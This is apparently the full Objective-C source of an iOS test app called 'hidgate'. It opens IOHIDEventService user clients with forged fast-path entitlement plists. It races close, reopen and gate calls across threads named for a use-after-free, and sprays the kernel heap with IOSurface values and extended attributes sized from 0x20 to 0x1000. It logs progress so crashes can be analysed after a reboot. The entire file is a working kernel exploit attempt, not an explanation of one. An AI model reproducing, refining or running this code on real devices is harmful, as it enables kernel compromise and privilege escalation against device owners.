#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <mach/mach_port.h>
#import <IOSurface/IOSurfaceRef.h>
#import <sys/xattr.h>
#import <fcntl.h>
#import <limits.h>
#import <pthread.h>
#import <unistd.h>
#import <stdatomic.h>
#import <stdarg.h>

#define MAX_CONNS 32
#define NUM_COPY_THREADS 8

static UITextView *gLog = nil;
static volatile atomic_bool g_stop = ATOMIC_VAR_INIT(false);
static io_connect_t g_conns[MAX_CONNS];
static int g_conn_count = 0;
static io_service_t g_target_service = MACH_PORT_NULL;
static unsigned long g_copy_ok = 0, g_copy_err = 0;
static unsigned long g_close_ok = 0, g_close_err = 0;
static unsigned long g_probe_ok = 0, g_probe_fail = 0;
static unsigned long g_gate_ok = 0, g_gate_err = 0;
static unsigned long g_client_ok = 0, g_client_err = 0;
static unsigned long g_inject_ok = 0, g_inject_err = 0;
static io_connect_t g_spray_conn = MACH_PORT_NULL;
static NSData *g_bigGateXML = nil;
#define SPRAY_SIZES 8
#define SPRAY_SLOTS 24
static const size_t g_spray_sizes[SPRAY_SIZES] = {0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000};
static IOSurfaceRef g_spray_surfaces[SPRAY_SIZES][SPRAY_SLOTS];
static unsigned g_spray_index[SPRAY_SIZES];
static unsigned long g_xattr_ok = 0, g_xattr_err = 0;
static unsigned long g_surf_ok = 0, g_surf_err = 0, g_surf_null = 0;
static char g_spray_path[PATH_MAX];
static NSData *g_gateXML;

static NSString *docsPath(void)
{
    return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
}
static NSString *logPath(void)
{
    return [docsPath() stringByAppendingPathComponent:@"hidgate.log"];
}
static void appendLog(NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[hidgate] %@", s);
    NSString *path = logPath();
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:path]) {
        [fm createFileAtPath:path contents:nil attributes:nil];
    }
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (fh) {
        @try {
            [fh seekToEndOfFile];
            [fh writeData:[[s stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
            [fh synchronizeFile];
        } @finally {
            [fh closeFile];
        }
    }
    if (gLog) {
        dispatch_async(dispatch_get_main_queue(), ^{
            gLog.text = [gLog.text stringByAppendingFormat:@"%@\n", s];
            NSRange r = NSMakeRange(gLog.text.length, 0);
            [gLog scrollRangeToVisible:r];
        });
    }
}

static NSData *buildGateXML(void)
{
    NSDictionary *dict = @{
        @"FastPathHasEntitlement": @YES,
        @"FastPathMotionEventEntitlement": @YES,
    };
    NSError *err = nil;
    NSData *data = [NSPropertyListSerialization dataWithPropertyList:dict
        format:NSPropertyListXMLFormat_v1_0 options:0 error:&err];
    if (!data) appendLog(@"gate xml failed: %@", err);
    return data;
}

static NSData *buildBigGateXML(void)
{
    NSMutableString *pad = [NSMutableString stringWithCapacity:0x800];
    for (int i = 0; i < 0x800; i++) {
        [pad appendString:@"A"];
    }
    NSDictionary *dict = @{
        @"FastPathHasEntitlement": @YES,
        @"FastPathMotionEventEntitlement": @YES,
        @"pad": pad,
    };
    NSError *err = nil;
    NSData *data = [NSPropertyListSerialization dataWithPropertyList:dict
        format:NSPropertyListXMLFormat_v1_0 options:0 error:&err];
    if (!data) appendLog(@"big gate xml failed: %@", err);
    return data;
}

static kern_return_t gateConn(io_connect_t conn)
{
    uint64_t scalar = 0;
    return IOConnectCallMethod(conn, 0, &scalar, 1,
        g_gateXML.bytes, g_gateXML.length, NULL, NULL, NULL, NULL);
}

static kern_return_t gateConnData(io_connect_t conn, NSData *xml)
{
    uint64_t scalar = 0;
    return IOConnectCallMethod(conn, 0, &scalar, 1,
        xml.bytes, xml.length, NULL, NULL, NULL, NULL);
}

static void *threadGateSpray(void *arg)
{
    (void)arg;
    pthread_setname_np("UAF-gate");
    if (g_spray_conn == MACH_PORT_NULL) return NULL;
    while (!atomic_load(&g_stop)) {
        kern_return_t kr = gateConnData(g_spray_conn, g_bigGateXML);
        if (kr == KERN_SUCCESS) g_gate_ok++; else g_gate_err++;
    }
    return NULL;
}

#define CLIENT_RING 2
static io_connect_t g_client_ring[CLIENT_RING];
static int g_client_idx = 0;

static void *threadClientChurn(void *arg)
{
    (void)arg;
    pthread_setname_np("UAF-client");
    while (!atomic_load(&g_stop)) {
        io_connect_t c = MACH_PORT_NULL;
        if (IOServiceOpen(g_target_service, mach_task_self(), 2, &c) == KERN_SUCCESS
                && c != MACH_PORT_NULL) {
            if (gateConn(c) == KERN_SUCCESS) {
                int idx = g_client_idx++ % CLIENT_RING;
                if (g_client_ring[idx]) IOServiceClose(g_client_ring[idx]);
                g_client_ring[idx] = c;
                g_client_ok++;
            } else {
                IOServiceClose(c);
                g_client_err++;
            }
        } else {
            g_client_err++;
        }
    }
    return NULL;
}

static void *threadChurn(void *arg)
{
    (void)arg;
    pthread_setname_np("UAF-close-inject");
    uint64_t scalar = 0;
    while (!atomic_load(&g_stop)) {
        if (g_conn_count > 0) {
            kern_return_t kr = IOConnectCallMethod(g_conns[0], 1, &scalar, 1,
                NULL, 0, NULL, NULL, NULL, NULL);
            if (kr == KERN_SUCCESS) g_close_ok++; else g_close_err++;

            io_connect_t tmp = MACH_PORT_NULL;
            if (IOServiceOpen(g_target_service, mach_task_self(), 2, &tmp) == KERN_SUCCESS
                    && tmp != MACH_PORT_NULL) {
                if (g_bigGateXML) gateConnData(tmp, g_bigGateXML);
                g_inject_ok++;
            } else {
                g_inject_err++;
            }

            gateConn(g_conns[0]);
            if (tmp != MACH_PORT_NULL) IOServiceClose(tmp);
        }
    }
    return NULL;
}

typedef struct { int idx; } ChurnArg;
static void *threadChurnIdx(void *arg)
{
    ChurnArg *a = (ChurnArg *)arg;
    pthread_setname_np("UAF-close-idx-inject");
    int idx = a->idx;
    uint64_t scalar = 0;
    while (!atomic_load(&g_stop)) {
        if (idx < g_conn_count) {
            kern_return_t kr = IOConnectCallMethod(g_conns[idx], 1, &scalar, 1,
                NULL, 0, NULL, NULL, NULL, NULL);
            if (kr == KERN_SUCCESS) g_close_ok++; else g_close_err++;

            io_connect_t tmp = MACH_PORT_NULL;
            if (IOServiceOpen(g_target_service, mach_task_self(), 2, &tmp) == KERN_SUCCESS
                    && tmp != MACH_PORT_NULL) {
                if (g_bigGateXML) gateConnData(tmp, g_bigGateXML);
                g_inject_ok++;
            } else {
                g_inject_err++;
            }

            gateConn(g_conns[idx]);
            if (tmp != MACH_PORT_NULL) IOServiceClose(tmp);
        }
    }
    return NULL;
}

typedef struct { int idx; } CopyArg;
static void *threadCopyEvent(void *arg)
{
    CopyArg *a = (CopyArg *)arg;
    int idx = a->idx;
    uint64_t args[2] = { 0, 1 };
    while (!atomic_load(&g_stop)) {
        kern_return_t kr = IOConnectCallMethod(g_conns[idx], 2,
            args, 2, NULL, 0, NULL, NULL, NULL, NULL);
        if (kr == KERN_SUCCESS) g_copy_ok++; else g_copy_err++;
    }
    return NULL;
}


static CFNumberRef spray_num(uint64_t v)
{
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

static void *threadSpray(void *arg)
{
    (void)arg;
    pthread_setname_np("SPRAY");
    uint8_t *buf = malloc(0x1000);
    if (!buf) return NULL;
    memset(buf, 0x41, 0x1000);

    while (!atomic_load(&g_stop)) {
        for (int s = 0; s < SPRAY_SIZES; s++) {
            size_t sz = g_spray_sizes[s];

            if (g_spray_path[0]) {
                if (setxattr(g_spray_path, "user.spray", buf, sz, 0, 0) == 0) {
                    g_xattr_ok++;
                } else {
                    g_xattr_err++;
                }
            }

            unsigned idx = g_spray_index[s]++ % SPRAY_SLOTS;
            if (g_spray_surfaces[s][idx]) {
                CFRelease(g_spray_surfaces[s][idx]);
                g_spray_surfaces[s][idx] = NULL;
            }

            CFMutableDictionaryRef props = CFDictionaryCreateMutable(
                kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks,
                &kCFTypeDictionaryValueCallBacks);
            if (!props) continue;

            CFNumberRef w = spray_num(16);
            CFNumberRef h = spray_num(16);
            CFNumberRef bpe = spray_num(4);
            CFNumberRef fmt = spray_num(0x42475241); /* BGRA */
            if (w && h && bpe && fmt) {
                CFDictionarySetValue(props, kIOSurfaceWidth, w);
                CFDictionarySetValue(props, kIOSurfaceHeight, h);
                CFDictionarySetValue(props, kIOSurfaceBytesPerElement, bpe);
                CFDictionarySetValue(props, kIOSurfacePixelFormat, fmt);
            }
            if (w) CFRelease(w);
            if (h) CFRelease(h);
            if (bpe) CFRelease(bpe);
            if (fmt) CFRelease(fmt);

            IOSurfaceRef surf = IOSurfaceCreate(props);
            CFRelease(props);
            if (surf) {
                CFDataRef data = CFDataCreate(kCFAllocatorDefault, buf, sz);
                if (data) {
                    IOSurfaceSetValue(surf, CFSTR("spray"), data);
                    CFRelease(data);
                }
                CFTypeRef check = IOSurfaceCopyValue(surf, CFSTR("spray"));
                if (check) {
                    CFRelease(check);
                    g_spray_surfaces[s][idx] = surf;
                    g_surf_ok++;
                } else {
                    CFRelease(surf);
                    g_surf_null++;
                }
            } else {
                g_surf_err++;
            }
        }
    }

    free(buf);
    return NULL;
}

static void runScan(void)
{
    appendLog(@"build=hidgate8");
    g_bigGateXML = buildBigGateXML();
    g_gateXML = buildGateXML();
    if (!g_gateXML) return;

    NSString *sprayFile = [NSTemporaryDirectory() stringByAppendingPathComponent:@"hidgate5-spray"];
    strncpy(g_spray_path, sprayFile.fileSystemRepresentation, sizeof(g_spray_path) - 1);
    int sfd = open(g_spray_path, O_CREAT | O_RDWR, 0644);
    if (sfd >= 0) {
        close(sfd);
    } else {
        g_spray_path[0] = 0;
    }
    appendLog(@"spray path=%s", g_spray_path[0] ? g_spray_path : "(none)");

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t kr = IOServiceGetMatchingServices(MACH_PORT_NULL,
        IOServiceMatching("IOHIDEventService"), &iter);
    appendLog(@"scan kr=%#x iter=%#x", kr, iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) {
        appendLog(@"no iterator");
        return;
    }

    io_service_t svc;
    int n = 0;
    while ((svc = IOIteratorNext(iter)) != MACH_PORT_NULL) {
        uint64_t regid = 0;
        IORegistryEntryGetRegistryEntryID(svc, &regid);
        io_name_t cls;
        IOObjectGetClass(svc, cls);
        appendLog(@"svc[%d] id=%#llx class=%s", n, regid, cls);

        io_connect_t tmp[MAX_CONNS];
        int opened = 0;
        for (int i = 0; i < MAX_CONNS; i++) {
            tmp[i] = MACH_PORT_NULL;
            if (IOServiceOpen(svc, mach_task_self(), 2, &tmp[i]) == KERN_SUCCESS &&
                tmp[i] != MACH_PORT_NULL) {
                opened++;
            }
        }

        int ok = 0;
        for (int i = 0; i < opened; i++) {
            kern_return_t gr = gateConn(tmp[i]);
            if (gr == KERN_SUCCESS) {
                g_conns[ok++] = tmp[i];
            } else {
                IOServiceClose(tmp[i]);
            }
        }
        appendLog(@"  opened=%d gate_ok=%d", opened, ok);

        if (ok >= 2) {
            g_target_service = svc;
            IOObjectRetain(g_target_service);
            int keep = ok > 6 ? 6 : ok;
            for (int i = keep; i < ok; i++) {
                IOServiceClose(g_conns[i]);
            }
            g_conn_count = keep;
            IOObjectRelease(svc);
            break;
        }

        for (int i = 0; i < ok; i++) {
            IOServiceClose(g_conns[i]);
        }
        g_conn_count = 0;
        IOObjectRelease(svc);
        n++;
        if (n > 500) break;
    }
    IOObjectRelease(iter);

    appendLog(@"gate_ok=%d", g_conn_count);
    if (g_conn_count < 2) {
        appendLog(@"no free provider; done");
        return;
    }

    if (g_bigGateXML) {
        IOServiceOpen(g_target_service, mach_task_self(), 2, &g_spray_conn);
    }

    pthread_t sprayThread;
    pthread_create(&sprayThread, NULL, threadSpray, NULL);

    pthread_t gateSprayThread;
    pthread_create(&gateSprayThread, NULL, threadGateSpray, NULL);

    pthread_t clientChurnThread;
    pthread_create(&clientChurnThread, NULL, threadClientChurn, NULL);

    pthread_t churnThread;
    pthread_create(&churnThread, NULL, threadChurn, NULL);

    ChurnArg churnArgs[3];
    pthread_t churnThreads[3];
    for (int i = 0; i < 3; i++) {
        churnArgs[i].idx = i % g_conn_count;
        pthread_create(&churnThreads[i], NULL, threadChurnIdx, &churnArgs[i]);
    }

    appendLog(@"phase=A close+inject+reopen 90s...");
    pthread_setname_np("UAF-main-A");
    sleep(90);
    appendLog(@"phase=B AOP probe 30s...");
    pthread_setname_np("AOP-probe-B");
    for (int iter = 0; iter < 300; iter++) {
        io_connect_t probes[8];
        int pn = 0;
        for (int i = 0; i < 8; i++) {
            io_connect_t c = MACH_PORT_NULL;
            if (IOServiceOpen(g_target_service, mach_task_self(), 2, &c) == KERN_SUCCESS
                    && c != MACH_PORT_NULL) {
                if (gateConn(c) == KERN_SUCCESS) {
                    probes[pn++] = c;
                    g_probe_ok++;
                } else {
                    IOServiceClose(c);
                    g_probe_fail++;
                }
            } else {
                g_probe_fail++;
            }
        }
        for (int i = 0; i < pn; i++) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
            mach_port_destroy(mach_task_self(), probes[i]);
#pragma clang diagnostic pop
        }
        usleep(100000);
        if ((iter % 10) == 0) {
            appendLog(@"iter=%d probe_ok=%lu fail=%lu close_ok=%lu close_err=%lu inject_ok=%lu inject_err=%lu gate_ok=%lu gate_err=%lu client_ok=%lu client_err=%lu",
                iter, g_probe_ok, g_probe_fail, g_close_ok, g_close_err,
                g_inject_ok, g_inject_err, g_gate_ok, g_gate_err,
                g_client_ok, g_client_err);
        }
    }

    atomic_store(&g_stop, true);
    pthread_join(sprayThread, NULL);
    pthread_join(gateSprayThread, NULL);
    pthread_join(clientChurnThread, NULL);
    pthread_join(churnThread, NULL);
    for (int i = 0; i < 3; i++) pthread_join(churnThreads[i], NULL);
    appendLog(@"done no panic");
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@property (nonatomic, strong) UITextView *textView;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application
    didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    self.textView = [[UITextView alloc] initWithFrame:vc.view.bounds];
    self.textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    self.textView.backgroundColor = [UIColor blackColor];
    self.textView.textColor = [UIColor greenColor];
    self.textView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.textView.editable = NO;
    [vc.view addSubview:self.textView];
    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];
    gLog = self.textView;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        runScan();
    });
    return YES;
}

@end

int main(int argc, char *argv[])
{
    @autoreleasepool {
        /* keep hidgate.log across launches for post-reboot analysis */
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
